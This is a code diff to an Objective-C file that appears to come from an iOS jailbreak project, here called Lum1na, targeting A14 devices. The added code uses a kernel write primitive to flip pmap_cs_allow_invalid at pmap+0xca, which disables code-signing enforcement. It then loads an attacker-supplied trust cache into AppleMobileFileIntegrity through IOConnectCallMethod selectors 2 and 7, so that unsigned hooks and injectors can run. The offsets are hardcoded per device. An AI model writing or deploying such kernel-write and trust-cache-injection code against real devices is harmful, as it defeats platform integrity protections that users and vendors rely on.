@@ -3,8 +3,112 @@
 #import "LabLocalTime.h"
 #import "LabRuntimeOffsets.h"
 #import "A14_23F77_LabOffsets.h"
+#import "Lum1naSocketKRW.h"
+#import "P06xLog.h"
+
 #import <IOKit/IOKitLib.h>
 #import <string.h>
+#import <uuid/uuid.h>
+#import <stdarg.h>
+
+#define AK_TAG @"afterkread"
+#define LUM_CDHASH_LEN 20
+
+typedef struct {
+    uint8_t hash[LUM_CDHASH_LEN];
+    uint8_t hash_type;
+    uint8_t flags;
+} __attribute__((packed)) lum_tc_entry_v1;
+
+typedef struct {
+    uint32_t version;
+    uuid_t uuid;
+    uint32_t length;
+    lum_tc_entry_v1 entries[];
+} __attribute__((packed)) lum_tc_file_v1;
+
+static void ak_log(NSMutableString *s, NSString *fmt, ...) {
+    va_list ap;
+    va_start(ap, fmt);
+    NSString *line = [[NSString alloc] initWithFormat:fmt arguments:ap];
+    va_end(ap);
+    [s appendFormat:@"%@\n", line];
+    P06xLog(AK_TAG, line);
+}
+
+static NSArray<NSString *> *ak_basebinNames(void) {
+    return @[
+        @"basebin.tc",
+        @"trustcache",
+        @"jbserver",
+        @"launchdhook.dylib",
+        @"dyldhook.dylib",
+        @"hookd",
+        @"opainject",
+    ];
+}
+
+static NSArray<NSString *> *ak_searchRoots(void) {
+    NSMutableArray *roots = [NSMutableArray array];
+    NSString *docs = NSSearchPathForDirectoriesInDomains(
+        NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
+    if (docs) {
+        [roots addObject:docs];
+        [roots addObject:[docs stringByAppendingPathComponent:@"basebin"]];
+        [roots addObject:[docs stringByAppendingPathComponent:@"tweaks"]];
+    }
+    NSString *bundle = [[NSBundle mainBundle] resourcePath];
+    if (bundle) {
+        [roots addObject:bundle];
+        [roots addObject:[bundle stringByAppendingPathComponent:@"basebin"]];
+    }
+    return roots;
+}
+
+static NSString *ak_findFile(NSString *name) {
+    for (NSString *root in ak_searchRoots()) {
+        NSString *path = [root stringByAppendingPathComponent:name];
+        if ([[NSFileManager defaultManager] fileExistsAtPath:path]) return path;
+    }
+    return nil;
+}
+
+static NSData *ak_loadTrustcacheBlob(NSMutableString *s) {
+    NSString *path = ak_findFile(@"basebin.tc");
+    if (!path) {
+        ak_log(s, @"[*] no basebin.tc in Documents/basebin, Documents, or bundle");
+        return nil;
+    }
+    NSData *data = [NSData dataWithContentsOfFile:path];
+    ak_log(s, @"[*] loaded %@ (%lu bytes)", path, (unsigned long)data.length);
+    if (data.length < sizeof(uint32_t) * 2 + sizeof(uuid_t)) {
+        ak_log(s, @"[-] basebin.tc too small for trustcache_file_v1");
+        return nil;
+    }
+    const lum_tc_file_v1 *tc = (const lum_tc_file_v1 *)data.bytes;
+    ak_log(s, @"[*] tc version=%u length=%u (Dopamine v1 layout)", tc->version, tc->length);
+    return data;
+}
+
+static io_connect_t ak_openAMFI(NSMutableString *s) {
+    mach_port_t master = 0;
+#if defined(kIOMainPortDefault)
+    master = kIOMainPortDefault;
+#else
+    master = kIOMasterPortDefault;
+#endif
+    io_service_t svc = IOServiceGetMatchingService(master, IOServiceMatching("AppleMobileFileIntegrity"));
+    if (!svc) {
+        ak_log(s, @"[-] AppleMobileFileIntegrity service missing");
+        return 0;
+    }
+    io_connect_t conn = 0;
+    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
+    IOObjectRelease(svc);
+    ak_log(s, @"[*] AMFI IOServiceOpen type=0 kr=0x%x conn=%u", kr, (unsigned)conn);
+    if (kr != KERN_SUCCESS) return 0;
+    return conn;
+}
 
 @implementation Lum1naAfterKread
 
@@ -13,10 +117,11 @@
     const char *tag = (off && off->tag) ? off->tag : "?";
     NSMutableString *s = [NSMutableString string];
     [s appendString:
-     @"LUM1NA CONSTELLATION (not /var/jb, not Dopamine BaseBin, not Relaxin):\n"
-     @"  After kreadbuf of a KNOWN kernel string → board.commitSlide.\n"
-     @"  Persist is the board + AMFI trust cache reloaded in THIS app each\n"
-     @"  userspace reboot. No second root, no launchdhook clone, no momentarius.\n"];
+     @"LUM1NA CONSTELLATION (Dopamine 3.0.10 BaseBin names, A14 PPL path):\n"
+     @"  After kreadbuf of a known kernel string -> board.commitSlide.\n"
+     @"  Then AMFI loadTrustCache sel 2/7 + pmap_cs_allow_invalid *(pmap+0xca)=1.\n"
+     @"  Tweak injection is trustcache of launchdhook/dyldhook/hookd, then inject.\n"
+     @"  Persist/tempRoot stay HOLD this pass.\n"];
     if (off && off->tag && strcmp(off->tag, "A12X_23G71") == 0) {
         [s appendString:@"A12X 23G71 = no SPTM. momentarius is PPL-on-KRW, not a kernel slot.\n"];
         [s appendFormat:@"T8020 pins (unslid) tag %s:\n", tag];
@@ -47,28 +152,93 @@
 }
 
 + (NSString *)tap {
+    P06xLogBegin(AK_TAG);
     NSMutableString *s = [NSMutableString string];
     Lum1naBoard *b = [Lum1naBoard shared];
-    
-    // Header
-    [s appendString:@"=== After-Kread Plan ===\n"];
-    [s appendFormat:@"hasKread=%@ leaks=%lu sku=%@\n", 
-     b.hasKread ? @"YES" : @"NO", (unsigned long)b.leaks.count, b.sku];
-    
-    if (!b.hasKread) {
-        [s appendString:@"HOLD: no kreadbuf. AMFI sel 2/7 and pmap_cs not invoked.\n"];
-        [s appendString:@"That is the point: glue is compiled, fire waits for the board.\n"];
-        return s;
+    const LabOffTab *off = LabOff();
+
+    ak_log(s, @"=== After-Kread %@ ===", LabLocalMilitaryNow() ?: @"?");
+    ak_log(s, @"hasKread=%@ hasKwrite=%@ leaks=%lu sku=%@ kslide=0x%llx",
+           b.hasKread ? @"YES" : @"NO",
+           b.hasKwrite ? @"YES" : @"NO",
+           (unsigned long)b.leaks.count,
+           b.sku ?: @"?",
+           (unsigned long long)b.kslide);
+    [s appendString:[self plan]];
+    P06xLog(AK_TAG, @"plan dumped");
+
+    ak_log(s, @"[*] Dopamine BaseBin names this slot will consume after hasKread:");
+    for (NSString *name in ak_basebinNames()) {
+        NSString *path = ak_findFile(name);
+        ak_log(s, @"    %-20s %@", name.UTF8String, path ?: @"(missing)");
     }
-    
-    // Now execute the after-kread plan
-    [s appendString:@"FIRING: KRW established, executing AMFI/pmap_cs plan\n"];
-    
-    // AMFI IOServiceOpen
-    [s appendString:@"[*] AMFI IOServiceOpen...\n"];
-    // ... rest of AMFI code ...
-    
-    return s;
+
+    io_connect_t conn = ak_openAMFI(s);
+    if (conn) {
+        ak_log(s, @"[+] AMFI user client open — reach OK");
+        IOServiceClose(conn);
+        conn = 0;
+    }
+
+    if (!b.hasKread) {
+        ak_log(s, @"HOLD: no kreadbuf. AMFI sel 2/7 and pmap_cs poke stay compiled, unfired.");
+        ak_log(s, @"Drop basebin.tc (and tweak dylibs) into Documents/basebin, then re-tap after commitSlide.");
+        [[Lum1naBoard shared] recordEvent:@"afterkread"
+                                     kind:@"hold"
+                                   detail:@"hasKread=NO"
+                                   source:@"afterkread"];
+        NSString *body = P06xLogDump(AK_TAG);
+        return body.length ? body : s;
+    }
+
+    ak_log(s, @"FIRING: board.hasKread, running Dopamine-shaped AMFI/pmap_cs path");
+    [[Lum1naBoard shared] recordEvent:@"afterkread"
+                                 kind:@"fire"
+                               detail:@"hasKread=YES"
+                               source:@"afterkread"];
+
+    uint32_t selCopy = off ? off->amfi_sel_copy : A14_23F77_AMFI_LOADTC_SEL_COPY;
+    uint32_t selManifest = off ? off->amfi_sel_manifest : A14_23F77_AMFI_LOADTC_SEL_MANIFEST;
+    uint32_t pmapOff = A14_23F77_PMAP_CS_ALLOW_OFF;
+
+    uint64_t pmapVA = 0;
+    for (NSDictionary *e in b.leaks) {
+        if (![e isKindOfClass:[NSDictionary class]]) continue;
+        if (![e[@"kind"] isEqualToString:@"pmap"]) continue;
+        pmapVA = strtoull([[e[@"va"] description] UTF8String], NULL, 16);
+        if (pmapVA) break;
+    }
+    if (pmapVA && b.krwContext) {
+        uint64_t addr = pmapVA + pmapOff;
+        ak_log(s, @"[*] pmap_cs poke *(0x%llx)=1 (pmap+0x%x)", (unsigned long long)addr, pmapOff);
+        bool ok = Lum1naSocketKRW_KWrite8((Lum1naSocketKRWContext *)b.krwContext, addr, 1);
+        ak_log(s, @"[%@] pmap_cs KWrite8", ok ? @"+" : @"-");
+    } else {
+        ak_log(s, @"[*] pmap poke waits for a leaks[] row kind=pmap (pmap kva still unknown)");
+    }
+
+    NSData *tc = ak_loadTrustcacheBlob(s);
+    conn = ak_openAMFI(s);
+    if (conn && tc) {
+        kern_return_t kr = IOConnectCallMethod(conn, selCopy,
+                                               NULL, 0,
+                                               tc.bytes, tc.length,
+                                               NULL, NULL, NULL, NULL);
+        ak_log(s, @"[*] AMFI loadTrustCache sel %u (copy) kr=0x%x", selCopy, kr);
+        kr = IOConnectCallMethod(conn, selManifest,
+                                 NULL, 0,
+                                 tc.bytes, tc.length,
+                                 NULL, NULL, NULL, NULL);
+        ak_log(s, @"[*] AMFI loadTrustCache sel %u (manifest) kr=0x%x", selManifest, kr);
+        IOServiceClose(conn);
+    } else if (conn) {
+        ak_log(s, @"[*] AMFI open with no basebin.tc — sel 2/7 not called");
+        IOServiceClose(conn);
+    }
+
+    ak_log(s, @"[*] tweak injection waits for a trustcached launchdhook.dylib (opainject). persist/tempRoot HOLD.");
+    NSString *body = P06xLogDump(AK_TAG);
+    return body.length ? body : s;
 }
 
 @end
